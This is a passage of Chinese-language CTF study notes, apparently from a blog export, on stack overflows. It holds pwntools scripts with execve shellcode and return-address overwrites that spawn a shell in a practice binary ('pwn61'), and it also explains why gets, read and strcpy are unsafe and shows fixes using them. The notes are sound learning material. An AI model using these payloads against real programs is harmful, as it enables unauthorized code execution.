class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># from pwn import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./pwn61&#x27;)</span></span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./pwn61&#x27;,&#x27;b printf&#x27;)</span></span><br><span class="line"><span class="comment"># #p = process(&#x27;./pwn61&#x27;)</span></span><br><span class="line"><span class="comment"># padding = 16 + 8</span></span><br><span class="line"><span class="comment"># shellcode = asm(&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     lea rdi,[rsp-0x12]</span></span><br><span class="line"><span class="comment">#     xor edx,edx</span></span><br><span class="line"><span class="comment">#     xor esi,esi</span></span><br><span class="line"><span class="comment">#     push 59</span></span><br><span class="line"><span class="comment">#     pop rax</span></span><br><span class="line"><span class="comment">#     syscall</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># p.recvuntil(&quot;[&quot;)</span></span><br><span class="line"><span class="comment"># v5addr = eval(p.recvuntil(&quot;]&quot;,drop = True))</span></span><br><span class="line"><span class="comment"># print(v5addr)</span></span><br><span class="line"><span class="comment"># print(hex(v5addr))</span></span><br><span class="line"><span class="comment"># payload = shellcode+b&#x27;/bin/sh\x00\x00\x00&#x27; + p64(v5addr)</span></span><br><span class="line"><span class="comment"># p.recvuntil(&quot;Maybe it&#x27;s useful ! But how to use it?&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.sendline(payload)</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># from pwn import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./pwn61&#x27;)</span></span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment"># p = process(elf.path)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># padding = 16 + 8</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment"># p.recvuntil(&quot;[&quot;)</span></span><br><span class="line"><span class="comment"># v5addr = eval(p.recvuntil(&quot;]&quot;,drop = True))</span></span><br><span class="line"><span class="comment"># print(v5addr)</span></span><br><span class="line"><span class="comment"># print(hex(v5addr))</span></span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27;*padding + p64(v5addr + 32) + shellcode</span></span><br><span class="line"><span class="comment"># p.recvuntil(&quot;Maybe it&#x27;s useful ! But how to use it?&quot;)</span></span><br><span class="line"><span class="comment"># p.sendline(payload)</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># from pwn import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./pwn61&#x27;)</span></span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment"># p = process(elf.path)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># padding = 16 + 8</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment"># p.recvuntil(&quot;[&quot;)</span></span><br><span class="line"><span class="comment"># v5addr = eval(p.recvuntil(&quot;]&quot;,drop = True))</span></span><br><span class="line"><span class="comment"># print(v5addr)</span></span><br><span class="line"><span class="comment"># print(hex(v5addr))</span></span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27;*padding + p64(v5addr + 32) + shellcode</span></span><br><span class="line"><span class="comment"># p.recvuntil(&quot;Maybe it&#x27;s useful ! But how to use it?&quot;)</span></span><br><span class="line"><span class="comment"># p.sendline(payload)</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br></pre></td></tr></table></figure>
<h2 id="这里遇到了send于sendline的问题">这里遇到了send于sendline的问题</h2>
<p>前提知识点:<br>
<a href="http://shellcraft.sh">shellcraft.sh</a>()当中的binsh是&quot;/bin/sh\x00&quot;其中的\x00是字符串结尾特征<br>
或者不用\x00,将binsh替换为/bin//sh	<code>&quot;/bin//sh&quot;</code> 和 <code>&quot;/bin/sh&quot;</code> 在 Linux 下等效（<code>execve</code> 会自动处理）。</p>
<p>我们用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = shellcode+b&#x27;/bin/sh&#x27; + b&#x27;a&#x27;*2 + p64(v5addr)</span><br><span class="line">...</span><br><span class="line">sendline(payload)</span><br></pre></td></tr></table></figure>
<p>是不可以的,因为sendline后面有一个回车,0x0a<br>
进而导致我们写进栈中的返回地址是不全的(gets接受到回车就抛弃回车)</p>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250505014210035.png" alt="image-20250505014210035"></p>
<p>那该怎么办呢?</p>
<p>方法一:保留sendline发送数据	前面/bin/sh补充多个数据\x00保证返回地址正确,将0x0a挤到下一行,保证返回地址能正确覆盖即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = shellcode+b&#x27;/bin/sh\x00\x00\x00&#x27; + p64(v5addr)</span><br><span class="line">...</span><br><span class="line">sendline(payload)</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250505024952655.png" alt="image-20250505024952655"></p>
<p>方法二:使用send发送数据	前面/bin/sh补充一个\x00数据以及两个0x61保证返回地址正确</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = shellcode+b&#x27;/bin/sh\x00&#x27;+b&#x27;a&#x27;*2 + p64(v5addr)</span><br><span class="line">...</span><br><span class="line">send(payload)</span><br><span class="line">或者</span><br><span class="line">sendline(payload)</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250505024825205.png" alt="image-20250505024825205"></p>
<p>方法三:/来补齐后面的返回地址,但是/bin/sh后面必须跟上\x00表示binsh字符串结束</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = shellcode+b&#x27;///bin/sh\x00&#x27; + p64(v5addr)</span><br><span class="line">...</span><br><span class="line">send(payload)</span><br><span class="line">或者</span><br><span class="line">sendline(payload)</span><br></pre></td></tr></table></figure>
<p>总结:只要返回地址正确传入栈内即可,如果send可以,sendline也一定可以,但是sendline后的回车是占一个字节的,构造shellcode的时候注意一下即可,如果shellcode后面还要传东西就一定不能使用sendline了</p>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250505032408503.png" alt="image-20250505032408503"></p>
]]></content>
      <tags>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出危险函数</title>
    <url>/2025/05/03/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1>gets</h1>
<p><img src="/2025/05/03/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/image-20250503195537710.png" alt="image-20250503195537710"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">36</span>];         <span class="comment">// [esp+0h]  [ebp-28h]  BYREF</span></span><br><span class="line">    <span class="comment">// 栈上分配36字节缓冲区</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> gets(s);     <span class="comment">// 调用gets函数读取用户输入</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>栈上为局部变量 <code>s</code> 分配了 0x28（即 40 十进制）字节的空间，用于 <code>char s[36]</code></p>
<p>编译器为了给数组s分配足够的空间以及进行栈对齐,就为s分配了0x28(40)字节的栈空间</p>
<h2 id="溢出原因"><strong>溢出原因</strong></h2>
<p>gets不会检查输入长度,并且在栈上,s后面接着放的是EBP和返回地址.所以我们可以输入任何东西将s和EBP填满和覆盖,接着如果我们再输入一些东西,就会将返回地址覆盖掉,如果我们将返回地址覆盖为我们想要跳转的函数地址就可以进行控制执行流.</p>
<h2 id="修复方法">修复方法</h2>
<p>使用安全输入函数替代 <code>gets()</code>，</p>
<p>函数原型</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">fgets</span><span class="params">(<span class="type">char</span> *s, <span class="type">int</span> size, FILE *stream)</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>s</code>: 输入数据保存到的缓冲区（char 数组）</li>
<li><code>size</code>: 最多读取的字符数（<strong>包括结尾的 <code>\0</code></strong>）</li>
<li><code>stream</code>: 输入来源，<code>stdin</code> 代表标准输入</li>
</ul>
<p>例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> s[<span class="number">36</span>];</span><br><span class="line">fgets(s, <span class="keyword">sizeof</span>(s), <span class="built_in">stdin</span>);</span><br></pre></td></tr></table></figure>
<p><code>sizeof(s)</code> 计算的是 <code>s</code> 的总大小（36 字节）；</p>
<p><code>fgets</code> 最多会读取 <strong>35 个字符</strong>，因为它保留 1 字节放 <code>\0</code>；</p>
<p><strong>即便用户输入超过 35 个字符，<code>fgets</code> 会自动截断，防止写出范围外！</strong></p>
<p>它会确保不会超出 <code>s</code> 的最大长度。</p>
<h1>read</h1>
<p><img src="/2025/05/03/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/image-20250503200745634.png" alt="image-20250503200745634"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  	_BYTE buf[<span class="number">14</span>]; 		<span class="comment">// [esp+6h] [ebp-12h] BYREF</span></span><br><span class="line">    <span class="comment">// 栈上分配14字节</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32u</span>); 	<span class="comment">// 从stdin读取0x32 (50) 字节</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>buf在栈上分配了14字节的空间</p>
<h2 id="溢出原因-2"><strong>溢出原因</strong></h2>
<p>buf在栈上有14字节的大小,而read标准输入了0x32字节,多出来的部分( 50 - 14 = 36 字节 )会覆盖栈后方的内容</p>
<h1>strcpy</h1>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(buf, <span class="string">&quot;这个字符串很长很长...&quot;</span>);  <span class="comment">// 明显溢出</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line"><span class="type">char</span> *user_input = get_user_input();  <span class="comment">// 用户可控输入</span></span><br><span class="line"><span class="built_in">strcpy</span>(buf, user_input);             <span class="comment">// 潜在溢出</span></span><br></pre></td></tr></table></figure>
<p>跟gets差不多</p>
<h2 id="修复方法-2">修复方法</h2>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">strncpy</span>(buf, src, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>);</span><br><span class="line">buf[<span class="keyword">sizeof</span>(buf)<span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;  <span class="comment">// 确保终止</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
</search>
